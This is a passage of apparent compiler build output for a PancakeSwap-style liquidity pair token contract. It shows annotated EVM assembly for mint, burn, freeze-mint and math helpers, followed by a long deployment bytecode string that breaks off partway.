data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc\n      dup4\n      codecopy\n      dup2\n      mload\n      swap2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1712:1743  Transfer(address(0), to, value) */\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1550:1750  function _mint(address to, uint256 value) internal {... */\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":134:237  function min(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_218:\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":192:201  uint256 z */\n      0x00\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":221:222  y */\n      dup2\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":217:218  x */\n      dup4\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":217:222  x < y */\n      lt\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":217:230  x < y ? x : y */\n      tag_383\n      jumpi\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":229:230  y */\n      dup2\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":217:230  x < y ? x : y */\n      jump(tag_384)\n    tag_383:\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":225:226  x */\n      dup3\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":217:230  x < y ? x : y */\n    tag_384:\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":213:230  z = x < y ? x : y */\n      swap4\n        /* \"src/exchange-protocol/contracts/libraries/Math.sol\":134:237  function min(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2238:2446  function _burn(address from, uint256 value) internal {... */\n    tag_242:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2319:2334  balanceOf[from] */\n      dup3\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2319:2328  balanceOf */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2319:2334  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2319:2345  balanceOf[from].sub(value) */\n      tag_386\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2339:2344  value */\n      dup3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2319:2345  balanceOf[from].sub(value) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2319:2338  balanceOf[from].sub */\n      tag_170\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2319:2345  balanceOf[from].sub(value) */\n      and\n      jump\t// in\n    tag_386:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2301:2316  balanceOf[from] */\n      dup4\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2301:2310  balanceOf */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2301:2316  balanceOf[from] */\n      0x20\n      mstore\n      0x40\n      dup2\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2301:2345  balanceOf[from] = balanceOf[from].sub(value) */\n      swap2\n      swap1\n      swap2\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2369:2380  totalSupply */\n      sload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2369:2391  totalSupply.sub(value) */\n      tag_387\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2385:2390  value */\n      dup3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2369:2391  totalSupply.sub(value) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2369:2384  totalSupply.sub */\n      tag_170\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2369:2391  totalSupply.sub(value) */\n      and\n      jump\t// in\n    tag_387:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2355:2366  totalSupply */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2355:2391  totalSupply = totalSupply.sub(value) */\n      swap1\n      dup2\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2406:2439  Transfer(from, address(0), value) */\n      0x40\n      dup1\n      mload\n      dup4\n      dup2\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup6\n      and\n      swap2\n      0x00\n      dup1\n      mload\n      0x20\n      data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc\n      dup4\n      codecopy\n      dup2\n      mload\n      swap2\n      mstore\n      swap2\n      swap1\n      dup2\n      swap1\n      sub\n      0x20\n      add\n      swap1\n      log3\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2238:2446  function _burn(address from, uint256 value) internal {... */\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1756:2232  function freezeMint(... */\n    tag_293:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1849:1853  bool */\n      0x00\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1911:1932  account != address(0) */\n      dup4\n      and\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1903:1968  require(account != address(0), \"BEP20: mint to the zero address\") */\n      tag_389\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x1f\n      0x24\n      dup3\n      add\n      mstore\n      0x42455032303a206d696e7420746f20746865207a65726f206164647265737300\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_389:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2058:2069  totalSupply */\n      sload(0x00)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2058:2081  totalSupply.add(amount) */\n      tag_390\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2074:2080  amount */\n      dup4\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2058:2081  totalSupply.add(amount) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2058:2073  totalSupply.add */\n      tag_348\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2058:2081  totalSupply.add(amount) */\n      and\n      jump\t// in\n    tag_390:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2044:2055  totalSupply */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2044:2081  totalSupply = totalSupply.add(amount) */\n      swap1\n      dup2\n      sstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2117:2140  _frozenBalance[account] */\n      dup5\n      and\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2117:2131  _frozenBalance */\n      0x03\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2117:2140  _frozenBalance[account] */\n      0x20\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2117:2152  _frozenBalance[account].add(amount) */\n      tag_391\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2145:2151  amount */\n      dup4\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2117:2152  _frozenBalance[account].add(amount) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2117:2144  _frozenBalance[account].add */\n      tag_348\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2117:2152  _frozenBalance[account].add(amount) */\n      and\n      jump\t// in\n    tag_391:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2091:2114  _frozenBalance[account] */\n      dup5\n      and\n      0x00\n      dup2\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2091:2105  _frozenBalance */\n      0x03\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2091:2114  _frozenBalance[account] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2091:2152  _frozenBalance[account] = _frozenBalance[account].add(amount) */\n      swap5\n      swap1\n      swap5\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2167:2204  Transfer(address(0), account, amount) */\n      dup4\n      mload\n      dup7\n      dup2\n      mstore\n      swap4\n      mload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2091:2114  _frozenBalance[account] */\n      swap3\n      swap4\n      swap2\n      swap3\n      0x00\n      dup1\n      mload\n      0x20\n      data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc\n      dup4\n      codecopy\n      dup2\n      mload\n      swap2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2167:2204  Transfer(address(0), account, amount) */\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2221:2225  true */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":1756:2232  function freezeMint(... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":319:437  function encode(uint112 y) internal pure returns (uint224 z) {... */\n    tag_340:\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":394:404  uint224(y) */\n      and\n      shl(0x70, 0x01)\n        /* \"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":394:411  uint224(y) * Q112 */\n      mul\n      swap1\n        /* \"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":319:437  function encode(uint112 y) internal pure returns (uint224 z) {... */\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":505:611  function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {... */\n    tag_341:\n        /* \"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":565:574  uint224 z */\n      0x00\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":594:604  uint224(y) */\n      dup3\n      and\n      sub(shl(0xe0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":590:604  x / uint224(y) */\n      dup5\n      and\n        /* \"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":594:604  uint224(y) */\n      dup2\n        /* \"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":590:604  x / uint224(y) */\n      tag_394\n      jumpi\n      invalid\n    tag_394:\n      div\n      swap4\n        /* \"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":505:611  function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {... */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":198:333  function add(uint256 x, uint256 y) internal pure returns (uint256 z) {... */\n    tag_348:\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":290:295  x + y */\n      dup1\n      dup3\n      add\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":285:301  (z = x + y) >= x */\n      dup3\n      dup2\n      lt\n      iszero\n        /* \"src/exchange-protocol/contracts/libraries/SafeMath.sol\":277:326  require((z = x + y) >= x, \"ds-math-add-overflow\") */\n      tag_181\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x14\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x60, 0x64732d6d6174682d6164642d6f766572666c6f77)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    stop\n    data_50b0a6dd250a09c1cd083ad4bf9f97424665d60e7bc0a208a1151c7d0051999c 50616e63616b653a20494e53554646494349454e545f494e5055545f414d4f554e54\n    data_6591c9f5bf1fefaad109b76a20e25c857b696080c952191f86220f001a83663e 556e697377617056323a20494e53554646494349454e545f4c49515549444954595f4d494e544544\n    data_6c050b0a8d3f2d18d11271ee0a551b7748437b8fa9a6165c561190d34a2947d6 50616e63616b653a20494e53554646494349454e545f4c49515549444954595f4255524e4544\n    data_ada389e1fc24a8587c776340efb91b36e675792ab631816100d55df0b5cf3cbc ddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n    data_c654718515b5f98052eb92744d97d32cccabf6e8b2bae886738591c9b906cfd8 50616e63616b653a20494e53554646494349454e545f4f55545055545f414d4f554e54\n    data_ef633320352a650c1d75752f13e6c73d8d8f7f26a5596a6d026c1bf50d2f7713 50616e63616b653a20494e53554646494349454e545f4c49515549444954595f4d494e544544\n\n    auxdata: 0xa265627a7a72315820fa4b361cdd6daa0da2a7850e045553687791240905a83c39dd556167998e768b64736f6c63430005100032\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052600680546001600160a01b03191673358bb1515a41a803ad950d3a0d22b914093ddb801790556001600f5534801561003b57600080fd5b50604051469080605261280f82396040805191829003605201822082820182526007808452664b4243204c507360c81b6020948501528251808401845260018152603160f81b908501528251808501929092527f6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe828401527fc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6606083015260808201959095523060a0808301919091528251808303909101815260c090910190915280519101206004555080546001600160a01b031916331790556126ea806101256000396000f3fe608060405234801561001057600080fd5b50600436106101e55760003560e01c806370a082311161010f578063bc25cf77116100a2578063dcbbb37311610071578063dcbbb373146105ff578063dd62ed3e14610625578063f317739c14610653578063fff6cae91461065b576101e5565b8063bc25cf7714610578578063c45a01551461059e578063d21220a7146105a6578063d505accf146105ae576101e5565b8063900820d8116100de578063900820d81461053457806395d89b411461053c578063a9059cbb14610544578063ba9a7a5614610570576101e5565b806370a08231146104a15780637464fc3d146104c75780637ecebe00146104cf57806389afcb44146104f5576101e5565b806323b872dd1161018757806347d5d8561161015657806347d5d856146104455780635909c0d51461046b5780635a3d5493146104735780636a6278421461047b576101e5565b806323b872dd146103e157806330adf81f14610417578063313ce5671461041f5780633644e5151461043d576101e5565b8063095ea7b3116101c3578063095ea7b31461032d5780630dfe16811461036d5780631794bb3c1461039157806318160ddd146103c7576101e5565b8063022c0d9f146101ea57806306fdde03146102785780630902f1ac146102f5575b600080fd5b6102766004803603608081101561020057600080fd5b8135916020810135916001600160a01b03604083013516919081019060808101606082013564010000000081111561023757600080fd5b82018360208201111561024957600080fd5b8035906020019184600183028401116401000000008311171561026b57600080fd5b509092509050610663565b005b610280610c17565b6040805160208082528351818301528351919283929083019185019080838360005b838110156102ba5781810151838201526020016102a2565b50505050905090810190601f1680156102e75780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6102fd610c3a565b604080516001600160701b03948516815292909316602083015263ffffffff168183015290519081900360600190f35b6103596004803603604081101561034357600080fd5b506001600160a01b038135169060200135610c64565b604080519115158252519081900360200190f35b610375610c7b565b604080516001600160a01b039092168252519081900360200190f35b610276600480360360608110156103a757600080fd5b506001600160a01b03813581169160208101359091169060400135610c8a565b6103cf610d13565b60408051918252519081900360200190f35b610359600480360360608110156103f757600080fd5b506001600160a01b03813581169160208101359091169060400135610d19565b6103cf610db3565b610427610dd7565b6040805160ff9092168252519081900360200190f35b6103cf610ddc565b6103cf6004803603602081101561045b57600080fd5b50356001600160a01b0316610de2565b6103cf610df4565b6103cf610dfa565b6103cf6004803603602081101561049157600080fd5b50356001600160a01b0316610e00565b6103cf600480360360208110156104b757600080fd5b50356001600160a01b03166110fe565b6103cf611110565b6103cf600480360360208110156104e557600080fd5b50356001600160a01b0316611116565b61051b6004803603602081101561050b57600080fd5b50356001600160a01b0316611128565b6040805192835260208301919091528051918290030190f35b6103756114cc565b6102806114db565b6103596004803603604081101561055a57600080fd5b506001600160a01b0381351690602001356114fd565b6103cf61150a565b6102766004803603602081101561058e57600080fd5b50356001600160a01b0316611510565b610375611679565b610375611688565b610276600480360360e08110156105c457600080fd5b506001600160a01b03813581169160208101359091169060408101359060608101359060ff6080820135169060a08101359060c00135611697565b6103cf6004803603602081101561061557600080fd5b50356001600160a01b0316611897565b6103cf6004803603604081101561063b57600080fd5b506001600160a01b0381358116916020013516611ae6565b6103cf611b03565b610276611b09565b600f546001146106ac576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f55841515806106bf5750600084115b6106fa5760405162461bcd60e51b815260040180806020018281038252602381526020018061266d6023913960400191505060405180910390fd5b600080610705610c3a565b5091509150816001600160701b03168710801561072a5750806001600160701b031686105b61077b576040805162461bcd60e51b815260206004820152601f60248201527f50616e63616b653a20494e53554646494349454e545f4c495155494449545900604482015290519081900360640190fd5b60008080606460058b02048a0390506000606460058b02600854600954929091048c0392506001600160a01b03908116918116908b1682148015906107d25750806001600160a01b03168b6001600160a01b031614155b610819576040805162461bcd60e51b815260206004820152601360248201527250616e63616b653a20494e56414c49445f544f60681b604482015290519081900360640190fd5b8c1561082a5761082a828c86611c69565b8b1561083b5761083b818c85611c69565b88156108f6578a6001600160a01b031663848008123386868e8e6040518663ffffffff1660e01b815260040180866001600160a01b03166001600160a01b03168152602001858152602001848152602001806020018281038252848482818152602001925080828437600081840152601f19601f8201169050808301925050509650505050505050600060405180830381600087803b1580156108dd57600080fd5b505af11580156108f1573d6000803e3d6000fd5b505050505b606460058e810282900491908e02048e15610923576006546109239085906001600160a01b031684611c69565b8d15610941576006546109419084906001600160a01b031683611c69565b604080516370a0823160e01b815230600482015290516001600160a01b038616916370a08231916024808301926020929190829003018186803b15801561098757600080fd5b505afa15801561099b573d6000803e3d6000fd5b505050506040513d60208110156109b157600080fd5b5051604080516370a0823160e01b815230600482015290519199506001600160a01b038516916370a0823191602480820192602092909190829003018186803b1580156109fd57600080fd5b505afa158015610a11573d6000803e3d6000fd5b505050506040513d6020811015610a2757600080fd5b505196506000955050505050506001600160701b0385168a90038311610a4e576000610a5d565b89856001600160701b03160383035b9050600089856001600160701b0316038311610a7a576000610a89565b89856001600160701b03160383035b90506000821180610a9a5750600081115b610ad55760405162461bcd60e51b81526004018080602001828103825260228152602001806125dd6022913960400191505060405180910390fd5b6000610b09610aeb84601963ffffffff611e0316565b610afd8761271063ffffffff611e0316565b9063ffffffff611e6616565b90506000610b21610aeb84601963ffffffff611e0316565b9050610b536305f5e100610b476001600160701b038b8116908b1663ffffffff611e0316565b9063ffffffff611e0316565b610b63838363ffffffff611e0316565b1015610ba3576040805162461bcd60e51b815260206004820152600a60248201526950616e63616b653a204b60b01b604482015290519081900360640190fd5b5050610bb184848888611eb6565b60408051838152602081018390528082018d9052606081018c905290516001600160a01b038b169133917fd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d8229181900360800190a350506001600f55505050505050505050565b604051806040016040528060078152602001664b4243204c507360c81b81525081565b600b546001600160701b0380821692600160701b830490911691600160e01b900463ffffffff1690565b6000610c71338484612079565b5060015b92915050565b6008546001600160a01b031681565b6007546001600160a01b03163314610cde576040805162461bcd60e51b81526020600482015260126024820152712830b731b0b5b29d102327a92124a22222a760711b604482015290519081900360640190fd5b600880546001600160a01b039485166001600160a01b0319918216179091556009805493909416921691909117909155600a55565b60005481565b6001600160a01b038316600090815260026020908152604080832033845290915281205460001914610d9e576001600160a01b0384166000908152600260209081526040808320338452909152902054610d79908363ffffffff611e6616565b6001600160a01b03851660009081526002602090815260408083203384529091529020555b610da98484846120db565b5060019392505050565b7f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c981565b601281565b60045481565b60036020526000908152604090205481565b600c5481565b600d5481565b6000600f54600114610e4b576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f81905580610e5b610c3a565b50600854604080516370a0823160e01b815230600482015290519395509193506000926001600160a01b03909116916370a08231916024808301926020929190829003018186803b158015610eaf57600080fd5b505afa158015610ec3573d6000803e3d6000fd5b505050506040513d6020811015610ed957600080fd5b5051600954604080516370a0823160e01b815230600482015290519293506000926001600160a01b03909216916370a0823191602480820192602092909190829003018186803b158015610f2c57600080fd5b505afa158015610f40573d6000803e3d6000fd5b505050506040513d6020811015610f5657600080fd5b505190506000610f75836001600160701b03871663ffffffff611e6616565b90506000610f92836001600160701b03871663ffffffff611e6616565b90506000610fa08787612183565b60005490915080610fdd57610fc96103e8610afd610fc4878763ffffffff611e0316565b6122f6565b9850610fd860006103e8612348565b61102c565b6110296001600160701b038916610ffa868463ffffffff611e0316565b8161100157fe5b046001600160701b03891661101c868563ffffffff611e0316565b8161102357fe5b046123cc565b98505b6000891161106b5760405162461bcd60e51b81526004018080602001828103825260268152602001806126906026913960400191505060405180910390fd5b6110758a8a612348565b61108186868a8a611eb6565b81156110b157600b546110ad906001600160701b0380821691600160701b90041663ffffffff611e0316565b600e555b6040805185815260208101859052815133927f4c209b5fc8ad50758f13e2e1088ba56a560dff690a1c6fef26394f4c03821c4f928290030190a250506001600f5550949695505050505050565b60016020526000908152604090205481565b600e5481565b60056020526000908152604090205481565b600080600f54600114611174576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f81905580611184610c3a565b50600854600954604080516370a0823160e01b815230600482015290519496509294506001600160a01b039182169391169160009184916370a08231916024808301926020929190829003018186803b1580156111e057600080fd5b505afa1580156111f4573d6000803e3d6000fd5b505050506040513d602081101561120a57600080fd5b5051604080516370a0823160e01b815230600482015290519192506000916001600160a01b038516916370a08231916024808301926020929190829003018186803b15801561125857600080fd5b505afa15801561126c573d6000803e3d6000fd5b505050506040513d602081101561128257600080fd5b5051306000908152600160205260408120549192506112a18888612183565b600054909150806112b8848763ffffffff611e0316565b816112bf57fe5b049a50806112d3848663ffffffff611e0316565b816112da57fe5b04995060008b1180156112ed575060008a115b6113285760405162461bcd60e51b81526004018080602001828103825260268152602001806126276026913960400191505060405180910390fd5b61133230846123e4565b61133d878d8d611c69565b611348868d8c611c69565b604080516370a0823160e01b815230600482015290516001600160a01b038916916370a08231916024808301926020929190829003018186803b15801561138e57600080fd5b505afa1580156113a2573d6000803e3d6000fd5b505050506040513d60208110156113b857600080fd5b5051604080516370a0823160e01b815230600482015290519196506001600160a01b038816916370a0823191602480820192602092909190829003018186803b15801561140457600080fd5b505afa158015611418573d6000803e3d6000fd5b505050506040513d602081101561142e57600080fd5b5051935061143e85858b8b611eb6565b811561146e57600b5461146a906001600160701b0380821691600160701b90041663ffffffff611e0316565b600e555b604080518c8152602081018c905281516001600160a01b038f169233927fdccd412f0b1252819cb1fd330b93224ca42612892bb3f4f789976e6d81936496929081900390910190a35050505050505050506001600f81905550915091565b6006546001600160a01b031681565b6040518060400160405280600681526020016504b42432d4c560d41b81525081565b6000610c713384846120db565b6103e881565b600f54600114611559576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f55600854600954600b54604080516370a0823160e01b815230600482015290516001600160a01b0394851694909316926116089285928792611603926001600160701b03169185916370a0823191602480820192602092909190829003018186803b1580156115cb57600080fd5b505afa1580156115df573d6000803e3d6000fd5b505050506040513d60208110156115f557600080fd5b50519063ffffffff611e6616565b611c69565b600b54604080516370a0823160e01b8152306004820152905161166f928492879261160392600160701b90046001600160701b0316916001600160a01b038616916370a0823191602480820192602092909190829003018186803b1580156115cb57600080fd5b50506001600f5550565b6007546001600160a01b031681565b6009546001600160a01b031681565b428410156116df576040805162461bcd60e51b815260206004820152601060248201526f14185b98d85ad94e881156141254915160821b604482015290519081900360640190fd5b6004546001600160a01b0380891660008181526005602090815260408083208054600180820190925582517f6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c98186015280840196909652958d166060860152608085018c905260a085019590955260c08085018b90528151808603909101815260e08501825280519083012061190160f01b6101008601526101028501969096526101228085019690965280518085039096018652610142840180825286519683019690962095839052610162840180825286905260ff89166101828501526101a284018890526101c28401879052519193926101e280820193601f1981019281900390910190855afa1580156117fa573d6000803e3d6000fd5b5050604051601f1901519150506001600160a01b038116158015906118305750886001600160a01b0316816001600160a01b0316145b611881576040805162461bcd60e51b815260206004820152601a60248201527f50616e63616b653a20494e56414c49445f5349474e4154555245000000000000604482015290519081900360640190fd5b61188c898989612079565b505050505050505050565b6000600f546001146118e2576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f819055806118f2610c3a565b50600854604080516370a0823160e01b815230600482015290519395509193506000926001600160a01b03909116916370a08231916024808301926020929190829003018186803b15801561194657600080fd5b505afa15801561195a573d6000803e3d6000fd5b505050506040513d602081101561197057600080fd5b5051600954604080516370a0823160e01b815230600482015290519293506000926001600160a01b03909216916370a0823191602480820192602092909190829003018186803b1580156119c357600080fd5b505afa1580156119d7573d6000803e3d6000fd5b505050506040513d60208110156119ed57600080fd5b505190506000611a0c836001600160701b03871663ffffffff611e6616565b90506000611a29836001600160701b03871663ffffffff611e6616565b90506000611a378787612183565b60005490915080611a7057611a5b6103e8610afd610fc4878763ffffffff611e0316565b9850611a6a60006103e8612470565b50611a90565b611a8d6001600160701b038916610ffa868463ffffffff611e0316565b98505b60008911611acf5760405162461bcd60e51b81526004018080602001828103825260288152602001806125ff6028913960400191505060405180910390fd5b611ad98a8a612470565b5061108186868a8a611eb6565b600260209081526000928352604080842090915290825290205481565b600a5481565b600f54600114611b52576040805162461bcd60e51b815260206004820152600f60248201526e14185b98d85ad94e881313d0d2d151608a1b604482015290519081900360640190fd5b6000600f55600854604080516370a0823160e01b81523060048201529051611c62926001600160a01b0316916370a08231916024808301926020929190829003018186803b158015611ba357600080fd5b505afa158015611bb7573d6000803e3d6000fd5b505050506040513d6020811015611bcd57600080fd5b5051600954604080516370a0823160e01b815230600482015290516001600160a01b03909216916370a0823191602480820192602092909190829003018186803b158015611c1a57600080fd5b505afa158015611c2e573d6000803e3d6000fd5b505050506040513d6020811015611c4457600080fd5b5051600b546001600160701b0380821691600160701b900416611eb6565b6001600f55565b604080518082018252601981527f7472616e7366657228616464726573732c75696e74323536290000000000000060209182015281516001600160a01b0385811660248301526044808301869052845180840390910181526064909201845291810180516001600160e01b031663a9059cbb60e01b1781529251815160009460609489169392918291908083835b60208310611d165780518252601f199092019160209182019101611cf7565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114611d78576040519150601f19603f3d011682016040523d82523d6000602084013e611d7d565b606091505b5091509150818015611dab575080511580611dab5750808060200190516020811015611da857600080fd5b50515b611dfc576040805162461bcd60e51b815260206004820152601860248201527f50616e63616b653a205452414e534645525f4641494c45440000000000000000604482015290519081900360640190fd5b5050505050565b6000811580611e1e57505080820282828281611e1b57fe5b04145b610c75576040805162461bcd60e51b815260206004820152601460248201527364732d6d6174682d6d756c2d6f766572666c6f7760601b604482015290519081900360640190fd5b80820382811115610c75576040805162461bcd60e51b815260206004820152601560248201527464732d6d6174682d7375622d756e646572666c6f7760581b604482015290519081900360640190fd5b6001600160701b038411801590611ed457506001600160701b038311155b611f19576040805162461bcd60e51b815260206004820152601160248201527050616e63616b653a204f564552464c4f5760781b604482015290519081900360640190fd5b600b5463ffffffff42811691600160e01b90048116820390811615801590611f4957506001600160701b03841615155b8015611f5d57506001600160701b03831615155b15611fce578063ffffffff16611f8b85611f7686612556565b6001600160e01b03169063ffffffff61256816565b600c80546001600160e01b03929092169290920201905563ffffffff8116611fb684611f7687612556565b600d80546001600160e01b0392909216929092020190555b600b80546dffffffffffffffffffffffffffff19166001600160701b03888116919091176dffffffffffffffffffffffffffff60701b1916600160701b8883168102919091176001600160e01b0316600160e01b63ffffffff871602179283905560408051848416815291909304909116602082015281517f1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1929181900390910190a1505050505050565b6001600160a01b03808416600081815260026020908152604080832094871680845294825291829020859055815185815291517f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9259281900390910190a3505050565b6001600160a01b038316600090815260016020526040902054612104908263ffffffff611e6616565b6001600160a01b038085166000908152600160205260408082209390935590841681522054612139908263ffffffff61258d16565b6001600160a01b03808416600081815260016020908152604091829020949094558051858152905191939287169260008051602061264d83398151915292918290030190a3505050565b600080600760009054906101000a90046001600160a01b03166001600160a01b031663017e7e586040518163ffffffff1660e01b815260040160206040518083038186803b1580156121d457600080fd5b505afa1580156121e8573d6000803e3d6000fd5b505050506040513d60208110156121fe57600080fd5b5051600e546001600160a01b0382161580159450919250906122e25780156122d